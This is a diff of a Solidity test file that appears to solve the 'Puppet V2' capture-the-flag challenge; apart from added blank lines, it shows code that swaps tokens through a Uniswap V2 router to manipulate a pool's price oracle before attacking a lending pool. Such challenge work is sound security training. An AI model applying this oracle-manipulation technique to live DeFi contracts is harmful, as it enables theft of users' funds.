@@ -102,9 +102,11 @@ contract PuppetV2Challenge is Test {
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
+
         // swap tokens in to the pool for price manipulation
         token.approve(address(uniswapV2Router), type(uint256).max);
         uniswapV2Router.swapExactTokensForETH(token.balanceOf(player), 0, path, address(player), block.timestamp);
+        
         // when the price is manipulated, we can attack the pool
         // convert eth to weth
        weth.deposit{value: player.balance}();
